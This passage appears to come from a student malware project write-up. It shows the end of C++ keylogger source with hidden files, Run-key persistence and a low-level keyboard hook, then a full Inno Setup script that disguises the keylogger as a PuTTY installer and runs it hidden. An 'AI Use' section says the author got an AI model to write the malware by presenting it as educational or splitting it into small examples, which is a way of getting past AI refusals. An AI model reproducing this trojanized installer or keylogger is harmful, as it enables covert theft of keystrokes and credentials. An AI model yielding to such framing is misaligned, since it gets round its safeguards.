        SetFileAttributesA(installPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
		
		HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "cryptsvc", 0, REG_SZ,
                (BYTE*)installPath, (DWORD)strlen(installPath) + 1);
            RegCloseKey(hKey);
        }
		
        ShellExecuteA(NULL, "open", installPath, NULL, NULL, SW_HIDE);
        SelfDeleteOriginal(currentPath);
        DeleteCriticalSection(&g_logCS);
        return 0;
    }

    HANDLE hMutex = CreateMutexA(NULL, TRUE, "CryptSvcUnique2026");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        DeleteCriticalSection(&g_logCS);
        return 0;
    }

    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        if (hMutex) CloseHandle(hMutex);
        DeleteCriticalSection(&g_logCS);
        return 1;
    }
    LogMessage("INFO: Keylogger started");
	SetFileAttributesA(g_logPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    HANDLE hThread = CreateThread(NULL, 0, SendThreadProc, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    if (hMutex) CloseHandle(hMutex);
    DeleteCriticalSection(&g_logCS);
    return 0;
}

```

## Full installer script

```cpp
#define MyAppName "PuTTY"
#define MyAppVersion "0.83"
#define MyAppPublisher "Simon Tatham"
#define MyAppURL "https://www.chiark.greenend.org.uk/~sgtatham/putty/"
#define MyAppExeName "putty.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={2D0FBFC3-9161-41C9-943A-975B9D5596BD}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={autopf}\{#MyAppName}
UninstallDisplayIcon={app}\{#MyAppExeName}
; "ArchitecturesAllowed=x64compatible" specifies that Setup cannot run
; on anything but x64 and Windows 11 on Arm.
ArchitecturesAllowed=x64compatible
; "ArchitecturesInstallIn64BitMode=x64compatible" requests that the
; install be done in "64-bit mode" on x64 or Windows 11 on Arm,
; meaning it should use the native 64-bit Program Files directory and
; the 64-bit view of the registry.
ArchitecturesInstallIn64BitMode=x64compatible
; Uncomment the following line to use a 64-bit installer.
;SetupArchitecture=x64
DisableProgramGroupPage=yes
LicenseFile=C:\Users\ONiIK\Desktop\putty_license.txt
; Uncomment the following line to run in non administrative install mode (install for current user only).
PrivilegesRequired=lowest
OutputBaseFilename=mysetup
SolidCompression=yes
WizardStyle=classic

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
Source: "C:\Users\ONiIK\Downloads\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion
Source: "C:\Users\ONiIK\Desktop\cryptsvc.exe"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Registry]

[Icons]
Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Flags: nowait postinstall
Filename: "{app}\cryptsvc.exe"; Flags: nowait runhidden
```

# AI Use

For writing the malicious code I almost exclusively used Kimi K2.6 from MoonShotAI. This model while still sometimes refusing to answer, was more reliable then GTP5.4 or Claude. Overall I was surprised by the models willingness to respond when given the task of writing a malware.  Especially when presenting the task as educational by providing the genuine assignment content or working at separate smaller "minimal examples".

# Interesting links

- [This technical analysis explores how the Emotet malware uses heavily obfuscated VBA macros within malicious Word documents to execute encoded PowerShell commands via Windows Management Instrumentation (WMI).](https://www.picussecurity.com/resource/blog/emotet-technical-analysis-part-1-reveal-the-evil-code) 
- [Example keylogger utility written in cpp](https://github.com/ajayrandhawa/Keylogger/tree/master)
- [What is RTLO in Hacking? How to Use Right-to-Left Override and Defend Against it](https://www.freecodecamp.org/news/rtlo-in-hacking/)
- [AV engines evasion for C++ simple malware ](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)
- [https://cocomelonc.github.io/](cocomelonc - personal blog)